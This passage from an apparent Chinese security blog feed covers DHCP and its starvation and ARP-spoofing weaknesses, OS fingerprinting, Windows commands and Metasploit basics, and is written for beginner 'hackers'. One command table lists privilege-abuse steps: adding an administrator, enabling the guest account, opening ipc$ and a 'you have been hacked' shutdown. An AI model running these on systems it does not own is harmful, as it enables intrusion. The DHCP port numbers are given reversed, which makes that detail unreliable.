客户端：亲爱的，我的礼物在哪里？</font>）</p><p>电脑的操作系统安装了TCP/IP协议栈，这个协议栈其中包含了DHCP客户端进程，这个客户端会广播发送一个发现服务器的报文，格式为UDP封装，目的端口号为68，源端口号为67</p><p>2、服务端回复客户端    (<font color='blue'> 服务端：亲爱的，这个礼物你要嘛</font>)</p><p>服务端接收到客户端的发现报文，会从IP地址池中选择一个空闲的IP地址、对应的子网掩码、缺省网关、DNS服务器IP地址，并以单播的方式发给客户端，目的端口是67，源端口号为68</p><p>3、客户端请求IP参数  （<font color='blue'> 客户端：亲爱的，我要我要</font>）</p><p>客户端接收到服务器的回应，接受服务器分配的IP参数，以单播的方式请求服务器提供的IP参数，发给服务器。</p><p>4、服务端确认请求   （<font color='blue'> 服务端：亲爱的，给你，你喜欢就好 </font>）</p><p>服务器最终确认客户端的请求，以单播方式发送给客户端。</p><p>5、客户端ARP广播确认   （<font color='blue'> 客户端接过礼物，看看自己的周围有没有一样的礼物，如果没有的话，就说：亲爱的，这个礼物好独特啊，我接受了；如果发现其他人也有这个礼物，就说，你给我的其他人也有了，我不要</font>）<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101401101.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>客户端接收到服务端的确认后，会尝试ARP请求自己IP所对应的MAC地址，看看有没有回复。如果没有回复，那就说明自己现在这个IP地址是<strong>该广播域内独一无二的</strong>，不会引起IP地址冲突。于是将自己获得<strong>IP参数配置到TCP/IP协议栈</strong><br><br><br><br><br></p><h1 id="03-客户端和服务端不在同一网段时，客户端通过广播发现服务器的机制"><a href="#03-客户端和服务端不在同一网段时，客户端通过广播发现服务器的机制" class="headerlink" title="03 客户端和服务端不在同一网段时，客户端通过广播发现服务器的机制"></a>03 客户端和服务端不在同一网段时，客户端通过广播发现服务器的机制</h1><p>在02 里说到了同一个网段里面DHCP协议的过程，我们会发现一个网段需要一个DHCP服务器。<font color='red'> 但是，对于有成千上万个网段的大型网段中，是不是需要巨大数量的DHCP服务器呢？这显然是不现实的。<br> </font></p><p>那么，当客户端和服务端不在同一个网段的时候，广播包跨越不过不同网段的时候，客户端如何通过广播发现服务端呢？其实也简单，你找个帮手，帮你喊话就得了，这个帮手就是<strong>DHCP中继代理</strong></p><p><strong>简单来说，DHCP中继代理就是让客户端和服务端互相发现彼此的中介结构。</strong><font color='blue'> 就是我们所谓的中介，帮我们传话的。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101256755.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p><br>具体是这样的，每个网段都配置一个<strong>DHCP中继代理</strong>，DHCP中继代理先静态配置DHCP服务器的IP地址，DHCP中继代理，自然可以接收到本网段的客户端DHCP广播报文，然后广播报文修改成单播报文，<strong>目的IP地址为DHCP服务器</strong>，源IP地址代理为自己的，然后单播发送给服务器，服务器的回复自然也是单播发给代理，代理再将服务器的回复单播发给客户端。<br><br><br><br></p><h1 id="04-客户端和服务端不在同一网段时，服务器给客户端分配到所属网段的IP地址的方法"><a href="#04-客户端和服务端不在同一网段时，服务器给客户端分配到所属网段的IP地址的方法" class="headerlink" title="04 客户端和服务端不在同一网段时，服务器给客户端分配到所属网段的IP地址的方法"></a>04 客户端和服务端不在同一网段时，服务器给客户端分配到所属网段的IP地址的方法</h1><p>有DHCP中继代理的情况下，接收到客户端广播的DHCP发现包时，会在DHCP报文内部填写一个字段【<strong>中继代理：10.1.1.1</strong>】</p><p>这样服务器接受到DHCP中继代理发过来的包时，就会<strong>根据中继代理的地址</strong>，找到网段10.1.1.0地址池，然后找出空闲的地址分配会客户端。<br><br><br><br><br></p><h1 id="05-DHCP协议存在的安全漏洞"><a href="#05-DHCP协议存在的安全漏洞" class="headerlink" title="05 DHCP协议存在的安全漏洞"></a>05 DHCP协议存在的安全漏洞</h1><p><font color='red'> 服务器会依据DHCP报文来唯一分配一个IP地址，这就是最大的安全漏洞。 </font></p><p>设想一下，<font color='red'> 一台恶意电脑，伪造了成千上万的MAC地址，用这些MAC地址分别发送DHCP消息报文。</font></p><p>而如果没有防护机制的话，DHCP就会分配出去IP地址，造成的结果是：IP地址池耗尽了，同一网段的其他用户无法自动拿到地址上网了。<font color='blue'> 这不就相当于，你占着茅坑不拉屎，浪费了资源嘛。</font><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101313211.jpg#pic_center" alt=""><br><br><br></p><h1 id="06-解决DHCP的安全漏洞的方法"><a href="#06-解决DHCP的安全漏洞的方法" class="headerlink" title="06 解决DHCP的安全漏洞的方法"></a>06 解决DHCP的安全漏洞的方法</h1><p>这里我们需要引入一个配置，叫 <strong>DHCP Snooping(DHCP 窥探)</strong></p><p>通过在网络的入口，最靠近用户的二层交换机上配置 DHCP Snooping，让二层交换机偷窥主机与DHCP服务器信息交换，当看到主机信息途经交换机时，交换机修改报文，在原报文的基础上添加一个安全选项【<strong>Option 82</strong>】，这个选项具体有哪些内容呢？</p><p><strong>交换机名称、交换机端口名称，即这条消息是从哪个交换机、哪个端口接收到的。</strong></p><p>交换机把这个定位主机的位置消息，添加到【Option 82】字段里。服务器不仅要看客户端MAC地址，还要参考主机的位置消息。<font color='red'> 如果设定一个交换机/端口最多只能分配两个IP地址，那么来自同一个交换机/端口的伪造DHCP报文都会被拒绝分配IP地址，因为超出了2个IP地址。</font><br><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020062010133016.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>除此之外，交换机还偷窥到服务器给主机分配的IP地址，还知道主机连接的<strong>端口号</strong>、主机的硬件地址<strong>MAC地址</strong>，生成一张表，用于记录<strong>交换机端口、MAC地址、IP地址的绑定关系</strong>。<br><br><br><br><strong>扩展：其实DHCP Snooping不仅可以解决DHCP欺骗问题，还可以解决ARP欺骗问题</strong></p><p><strong>ARP欺骗</strong></p><p>当同网段进行通信的时候，需要使用ARP广播来发现彼此的MAC地址。<br>但是如果小A和小B进行通信的时候，小A问小B的MAC地址，而小C听到了，用自己的MAC地址来回应。让小A信以为真，觉得小C是小B，原来发给小B的流量都发给小C了。如何小C看完内容后，再用小B的MAC地址作为目的MAC发给小B。这就是网络流量的劫持</p><p><font color='red'> 而如果小C冒充网关的话，则网段里面访问其他网段的流量都会被小C劫持。这很危险<br> </font><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200620101342216.jpg#pic_center" alt=""></p><p>而使用了DHCP Snooping后，二层交换机有了一份绑定表，当小C试图欺骗小A，自称小B时。交换机因为已经有了小B的MAC、IP、端口号，所以就会发现这个欺诈行为，如何直接丢弃，并在日志文件里记录这个欺骗行为。</p><p><br><br><br><br></p><p><strong>以上文章，作为自己的学习笔记，仅供参考</strong></p><p>本文完，感谢你的阅读！！！</p><p>最后，如果本文对你有所帮助，<strong>希望可以点个赞支持一下</strong>。你们的鼓励将会是博主原创的动力。<br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200616063600946.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DHCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础知识——判断服务器系统是Windows  or   Linux</title>
      <link href="/2020/07/19/hei-ke-ji-chu-zhi-shi-pan-duan-fu-wu-qi-xi-tong-shi-windows-or-linux/"/>
      <url>/2020/07/19/hei-ke-ji-chu-zhi-shi-pan-duan-fu-wu-qi-xi-tong-shi-windows-or-linux/</url>
      
        <content type="html"><![CDATA[<p>聪明的你有办法通过一个服务器开启的网页服务，来判断该服务器上运行的是Windows操作系统还是Linux操作系统嘛？</p><p>有办法的！</p><p><strong>记住，Linux系统区分大小写，Windows系统不区分大小写</strong></p><p>在一般情况下，网站服务器没做任何的相关配置时，<br>当我们能够访问一个网站的时候，可以更改网站链接字母大小写来判断服务器系统。</p><p>1、大写后不报错，一般可以判断为Windows系统,</p><p>2、大写后如果报错, 一般可以判断为Linux系统</p><p>以本机windows操作系统为例：<br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200521094742858.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200521094751773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>由上两图对比可知，不区分大小写，为windows操作系统</strong></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础知识——判断Windows系统的版本 32Bit  or   64Bit</title>
      <link href="/2020/07/19/hei-ke-ji-chu-zhi-shi-pan-duan-windows-xi-tong-de-ban-ben-32bit-or-64bit/"/>
      <url>/2020/07/19/hei-ke-ji-chu-zhi-shi-pan-duan-windows-xi-tong-de-ban-ben-32bit-or-64bit/</url>
      
        <content type="html"><![CDATA[<p><strong>如果你是一名黑客，渗透了一台windows系统主机，特殊情况下，当你不能通过cmd命令行，使用sysinfo查看本机信息的时候，你还有其他方法来判断本机究竟是32Bit还是64Bi嘛？</strong></p><p>不要担心，作为一名成熟的黑客，我们不仅有方便的快捷命令查看方式，还有最原始的瞅瞅本地文件方式。</p><p>知识点来啦<del>~</del></p><p>进入本地C盘下，瞅一瞅文件夹：<br><strong>如果本机C盘中包含如下目录[Program Files (x86)] ，说明本机是64Bit,如果不包含此目录,说明本机是32Bit。</strong></p><p>以我的电脑为例，<img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200521092943494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>由于<strong>存在Program Files (x86)文件夹</strong>，所以判断出<strong>我的电脑是windows系统64bit版本</strong>。</p><p>知道了这个消息之后，在之后的渗透中<strong>选用64bit的paylaod</strong>就更能提高渗透成功率哟！</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 系统版本 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础知识——Windows操作系统下的常用DOS命令</title>
      <link href="/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-cao-zuo-xi-tong-xia-de-chang-yong-dos-ming-ling/"/>
      <url>/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-cao-zuo-xi-tong-xia-de-chang-yong-dos-ming-ling/</url>
      
        <content type="html"><![CDATA[<p><strong>话不多说，直接上DOS命令</strong></p><table><thead><tr><th>命令</th><th>含义</th></tr></thead><tbody><tr><td><strong>Color</strong></td><td>改变CMD颜色(例: color FO, F表示背景白色，0表示字体是黑色)</td></tr><tr><td><strong>Ping  -t  -c</strong></td><td>用来测试网络连通性，可以根据返回TTL值判断对方操作系统(TTL=128–&gt;WinXP; TTL&lt;68–&gt;Linux)</td></tr><tr><td><strong>IPconfig /all /renew/release</strong></td><td>:查看本机IP地址等信息</td></tr><tr><td><strong>Systeminfo</strong></td><td>: 查看系统信息打补丁</td></tr><tr><td><strong>ARP-a -d -s</strong></td><td>:查看本机ARP缓存信息</td></tr><tr><td><strong>net view</strong></td><td>查看局域网内其它计算机名称</td></tr><tr><td><strong>Winver</strong></td><td>查看Windows操作系统的版本</td></tr><tr><td><strong>Shutdown-s-t 180-c“你的系统被黑了，系统即将关机!”</strong></td><td>命令行关机命令</td></tr><tr><td><strong>Dir</strong></td><td>查看目录</td></tr><tr><td><strong>CD</strong></td><td>切换进入目录</td></tr><tr><td><strong>Start <a href="http://www.baidu.com" target="_blank" rel="noopener external nofollow noreferrer">www.baidu.com</a></strong></td><td>打开某个网页</td></tr><tr><td><strong>Start 123.txt</strong></td><td>打开某个文件</td></tr><tr><td><strong>Cls</strong></td><td>清楚屏幕内容; MD目录名:创建目录</td></tr><tr><td><strong>Del 123.txt</strong></td><td>删除文件</td></tr><tr><td><strong>copy</strong></td><td>复制</td></tr><tr><td><strong>move</strong></td><td>移动/剪切</td></tr><tr><td><strong>Tree</strong></td><td>树形列出文件夹结构</td></tr><tr><td><strong>Net start telnet</strong></td><td>开启telnet服务</td></tr><tr><td><strong>Net stop telnet</strong></td><td>停止telnet服务</td></tr><tr><td><strong>Net user 用户名/del</strong></td><td>将某个用户名删除</td></tr><tr><td><strong>Net user 用户名密码/add</strong></td><td>建立某个用户</td></tr><tr><td><strong>Net user guest /active</strong></td><td>yes 激活guest用户</td></tr><tr><td><strong>Net user</strong></td><td>查看哪些用户</td></tr><tr><td><strong>net user 用户名</strong></td><td>查看用户的属性</td></tr><tr><td><strong>Net localgroup administrators 用户名/add</strong></td><td>将用户赋予管理员权限</td></tr><tr><td><strong>Net user guest 123456</strong></td><td>用guest用户登录后将密码改为123456</td></tr><tr><td><strong>Net password 密码</strong></td><td>更改系统的登录密码</td></tr><tr><td><strong>Net share</strong></td><td>查看本地开启的共享文件夹信息</td></tr><tr><td><strong>Net share ipc$</strong></td><td>开启ipc$共享</td></tr><tr><td><strong>Net share ipc$ /del</strong></td><td>删除ipc$共享</td></tr><tr><td><strong>Net share c$ /del</strong></td><td>删除c盘共享</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Winodws </tag>
            
            <tag> Dos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础知识——Windows快捷键使用</title>
      <link href="/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-kuai-jie-jian-shi-yong/"/>
      <url>/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-kuai-jie-jian-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>善用快捷键，让你的渗透效率不止快一点点哟~</p><br><table><thead><tr><th>快捷键</th><th>作用</th></tr></thead><tbody><tr><td>F1</td><td>帮助</td></tr><tr><td>F2</td><td>重命名</td></tr><tr><td>F3</td><td>在桌面时，打开查找页面</td></tr><tr><td>F5</td><td>刷新</td></tr><tr><td>CTRL+F5</td><td>强制刷新</td></tr><tr><td>F10或ALT</td><td>激活当前程序的菜单栏</td></tr><tr><td>Win键或CTRL+ESC</td><td>打开开始菜单</td></tr><tr><td>CTRL+ALT+DEL</td><td>打开关闭程序对话框</td></tr><tr><td>DELETE</td><td>删除文件/文件夹,放入回收站</td></tr><tr><td>SHIFT+DELETE</td><td>彻底删除，不放入回收站</td></tr><tr><td>Printscreen</td><td>将当前屏幕截屏保存</td></tr><tr><td>CTRL+N</td><td>新建文件</td></tr><tr><td>CTRL+O</td><td>打开文件对话框</td></tr><tr><td>CTRL+P</td><td>打印</td></tr><tr><td>CTRL+S</td><td>保存当前文件</td></tr><tr><td>CTRL+C</td><td>拷贝</td></tr><tr><td>CTRL+X</td><td>剪切</td></tr><tr><td>CTRL+V</td><td>粘贴</td></tr><tr><td>WIN键+M</td><td>最小化所有被打开的窗口(老师来了，必按)</td></tr><tr><td>WIN键+E</td><td>打开资源管理器</td></tr><tr><td>Win键+F</td><td>查找文件</td></tr><tr><td>WIN键+R</td><td>打开运行对话框</td></tr><tr><td>Win键+TAB</td><td>多窗口切换(Windows7下3D效果超炫)</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 快捷键 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客基础知识——windows常用端口号</title>
      <link href="/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-chang-yong-duan-kou-hao/"/>
      <url>/2020/07/19/hei-ke-ji-chu-zhi-shi-windows-chang-yong-duan-kou-hao/</url>
      
        <content type="html"><![CDATA[<p>正所谓，知己知彼，百战百胜。我们在信息收集的初期，可以通过Nmap等端口扫描工具来进行端口的扫描，确定其存在的服务，方便后续渗透对其主机进行针对性的漏洞测试。</p><p>而这就要求我们，<strong>在我们通过端口扫描得知了目标主机开启的端口、服务情况后，需要知道对应进一步的渗透测试方向</strong>。</p><p>接下来我就给大家分享，有关我对端口下的渗透方向理解：</p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200521091437556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""></p><p>相信当你有了以上大概的一个方向后，你之后的渗透之旅会顺畅许多<del>~</del></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黑客你咋这么牛掰，不屑用鼠标？</title>
      <link href="/2020/07/19/hei-ke-ni-zha-zhe-me-niu-bai-bu-xie-yong-shu-biao/"/>
      <url>/2020/07/19/hei-ke-ni-zha-zhe-me-niu-bai-bu-xie-yong-shu-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="01-前情提要"><a href="#01-前情提要" class="headerlink" title="01 前情提要"></a>01 前情提要</h1><p>很多人很难想象有一群人能在不用鼠标的情况下，对电脑进行操作，且实现了很多风骚的操作。</p><p>他们会说:这就是黑客嘛，连鼠标都不用，是觉得用鼠标太low了吧，这也太酷了</p><p>但是，<strong>实际上啊，黑客们不是不屑用鼠标，而是实在有苦衷啊！</strong></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523113652629.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h1 id="02-有苦说得出"><a href="#02-有苦说得出" class="headerlink" title="02 有苦说得出"></a>02 有苦说得出</h1><p>下面我就和大家诉诉黑客的苦：</p><h2 id="1、黑客开发绝大多数工具是没有图形化界面的"><a href="#1、黑客开发绝大多数工具是没有图形化界面的" class="headerlink" title="1、黑客开发绝大多数工具是没有图形化界面的"></a>1、黑客开发绝大多数工具是没有图形化界面的<br></h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523114026147.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>如果说黑客开发必要的功能需要花费1个单位的时间，那么黑客为了实现工具图形化界面可能还需要花费0.5-1个单位时间。</p><p>我们看起来简简单单的界面，其实实现起来的工作量已经不小，而华丽的界面实现起来的工作量甚至不比实现核心功能的时间少了。</p><p><strong>试问:在一定的时间内，你写一张试卷，到底是把大部分时间花在解题上，还是大部分时间花在检查自己字写的好不好看上呢？</strong></p><p>所以啊，同理，有这功夫做图形化界面还不如多花点心思琢磨功能呢，<strong>功能才是你的核心</strong>！</p><p>虽然黑客拥有的图形化界面少是少，但总归还是有的，比如这些年来集成渗透测试工具的<strong>kali系统</strong>、业界闻名的    <strong>Metasploit 渗透测试框架</strong>，这都大大降低了黑客入门门槛，实为我等黑客萌新的福利。<br><br></p><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523113923630.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523113932585.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br></p><h2 id="2、命令行更有助于批量操作"><a href="#2、命令行更有助于批量操作" class="headerlink" title="2、命令行更有助于批量操作"></a>2、命令行更有助于批量操作</h2><p>比如通过使用命令行脚本自动化执行，省去了不少功夫</p><p>举个例子:<br>如果我们想要在每天晚上9:00的时候，将某个目录下的文件，全部重命名为今天日期+文件本名，如 2020-5-23-test.word，并将其备份入backup文件夹。</p><p>你会怎么做呢？</p><p>如果你是图形界面的话，单凭鼠标操作。<br>首先鼠标来回点 n 个文件且不停拖拽效率会低不少。<br>其次，每天不断的重复性操作也会消磨你的耐性。</p><p>而如果你是命令行界面，在Linux下我们可以<strong>使用命令组合系统里的各种工具</strong>，再配合上<strong>定时命令</strong>，就可以简简单单实现以上操作。且一劳永逸。</p><p><strong>效率高低，立见分晓</strong>。<br><br></p><h2 id="3、图形化界面消耗系统资源量大，增加计算机性能负担"><a href="#3、图形化界面消耗系统资源量大，增加计算机性能负担" class="headerlink" title="3、图形化界面消耗系统资源量大，增加计算机性能负担"></a>3、图形化界面消耗系统资源量大，增加计算机性能负担</h2><p>我们知道，大多数的大型服务器通常安装的是Linux操作系统，且都并不安装图形化界面，这是为什么呢？<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523114047764.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br><br><strong>第一是Linux操作系统的稳定性</strong></p><p>你服务器运行Linux系统，个几年不断电，照样稳得一批。</p><p>而如果是windows操作系统，你就想想如果是你的笔记本电脑，连续几天不关机，这卡顿就够你受的了。<br><br><br><strong>第二是图形化界面耗资源</strong></p><p>如果某一天服务器突然宕机，需要重新启动。</p><p>你命令行界面不到几秒就开机正常工作了，而图形化界面都几分钟了还在转圈圈加载。这对公司的损失，可大了去了<br><br></p><h2 id="4、传统使用习惯"><a href="#4、传统使用习惯" class="headerlink" title="4、传统使用习惯"></a>4、传统使用习惯</h2><p>黑客这行当啊，不可否认，欧美国家出现的比我们早。对那些黑客而言，他们接触最多的就是Linux/nuix系统，黑客们从几十年前就开始玩这些Linux系统，玩命令行6得飞起了。<br><br><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200523114104938.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>而对于我网民同志们来说，一开始接触电脑，通常就是接触的Windows操作系统，借用心理学上的首因效应来说，即第一印象非常重要。我们以为我们见到的是普遍的、正常的，所以，我们自然而然地认为操作电脑就是要通过鼠标咯<del>~</del></p><p>通过以上的说明，希望大家更能理了解到，<strong>实际上啊，黑客们不是不屑用鼠标，而是实在有苦衷啊！</strong></p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令行 </tag>
            
            <tag> 图形化界面 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>零基础使用Metasploit进行渗透？你不得不掌握的基础知识</title>
      <link href="/2020/07/19/ling-ji-chu-shi-yong-metasploit-jin-xing-shen-tou-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/"/>
      <url>/2020/07/19/ling-ji-chu-shi-yong-metasploit-jin-xing-shen-tou-ni-bu-de-bu-zhang-wo-de-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200513103343602.jpg#pic_center" alt=""><br>关于Metasploit这里有四个简单的问题，先供大家思考<br><br></p><p><strong>01 metasploit是什么？</strong></p><p><strong>02 我们能使用metasploit用来干什么？</strong></p><p><strong>03 metasploit的专业术语有哪些？</strong><br>大致的步骤是什么？**</p><p>那么接下来，我就来简单介绍一下相关内容。<br><br></p><h2 id="01-metasploit是什么？"><a href="#01-metasploit是什么？" class="headerlink" title="01 metasploit是什么？"></a>01 metasploit是什么？</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/20200513103408492.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br>metasploit框架，即msf，是一个用于渗透测试的开源工具，可以理解为如果你是一名电工，要修理电器，而msf就相当于是你完备的工具箱。基本上你在维修过程中想到的，就会有工具让你用。<br><br></p><h2 id="02-我们能使用metasploit用来干什么？"><a href="#02-我们能使用metasploit用来干什么？" class="headerlink" title="02 我们能使用metasploit用来干什么？"></a>02 我们能使用metasploit用来干什么？</h2><p><img src="/medias/comment_bg.png" data-original="https://img-blog.csdnimg.cn/2020051310342043.jpeg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxMjUzOTg3OTkyOA==,size_16,color_FFFFFF,t_70#pic_center" alt=""><br><br>我们可以通过使用msf的所有插件，如payload、exploit、post模块等，直接对一个网站、主机进行渗透厕所，也可以通过命令行下输入msfconsole使用nmap、sqlmap等第三方程序</p><h2 id="03-metasploit的专业术语有哪些？"><a href="#03-metasploit的专业术语有哪些？" class="headerlink" title="03 metasploit的专业术语有哪些？"></a>03 metasploit的专业术语有哪些？</h2><p><strong>专业术语:</strong><br><strong>1）auxiliaries(辅助模块)</strong><br><br>该模块不会在测试者和被测试者之间建立访问连接，只负责指纹扫描、嗅探、执行扫描等相关功能用以辅助测试。</p><p>就相当于，入室抢劫之前，你会有一个观察这个房屋构造的步骤，看看有没有什么窗口可以偷偷潜伏进去，看看这个房屋构造有哪些是可以借机偷偷溜进去的<br><br><br><strong>2）exploit(漏洞利用模块)</strong><br><br>漏洞利用是指由渗透测试者利用一个系统、应用或者服务中的安全漏洞进行的攻击行为。流行的渗透攻击技术有:缓冲区溢出、web应用程序攻击、以及利用配置错误，其中包括攻击者针对系统中的漏洞而设计的各种poc验证程序，破坏系统安全性的攻击代码。</p><p>就相当于，入室抢劫时，你发现了有个低矮的窗户可以通过搭梯子的方式进入室内，于是你利用这个方式达到你入室抢劫的目标</p><p><strong>3）payload(攻击载荷模块)</strong><br><br>攻击载荷是我们期望系统目标在被渗透之后实际完成实际攻击的代码，成功渗透目标后，用于在目标系统运行任意命令或执行特定代码。也可以是简单在目标操作系统上执行一些如添加用户的命令。</p><p>就相当于，入室抢劫时，确定实施犯罪的具体人选。可以选择人进去，因为我们进去之后，可以到处搜值钱的东西，实施犯罪行为。也可以是选择投入一个机器人，这个机器人可以把收集的东西抛出来等等<br><br></p><p><strong>4）post(后期渗透模块)</strong><br><br>该模块主要用于在取得目标系统远程控制权后，进行一系列的后渗透攻击动作。如获取敏感信息、实施跳板攻击等。</p><p>就相当于，入室抢劫后，你作为犯罪者进入到室内，可以干的事情，比如先找到个逃跑路线(进程迁移)、到处翻看屋子里有没有银行卡信息、身份证信息(获取敏感信息)、磨个钥匙方便下次再次光临(后门)<br><br><br><strong>5）encoders(编码工具模块)</strong><br><br>该模块在渗透测试中负责免杀，防备杀毒软件等安全软件检测出来。</p><p>就相当于，入室盗窃时，你可以给自己套上黑丝袜，免得被监控设施拍到</p><p><br><br></p><h2 id="04-我们使用该工具进行渗透的时候，大致的步骤是什么？"><a href="#04-我们使用该工具进行渗透的时候，大致的步骤是什么？" class="headerlink" title="04 我们使用该工具进行渗透的时候，大致的步骤是什么？"></a>04 我们使用该工具进行渗透的时候，大致的步骤是什么？</h2><p>渗透攻击步骤:<br>①扫描目标主机，寻找可用漏洞<br><br>②选择并配置一个漏洞利用模块<br><br>③选择并配置一个攻击载荷模块<br><br>④选择一个编码技术，用来绕过杀毒软件的查杀<br><br>⑤渗透攻击<br></p><p><br><br><br><strong>如果想了解更多有关与Metasploit的使用方法，欢迎关注我，我致力于以通俗易懂的语言带你一步步调教这个小玩意儿····</strong>```</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
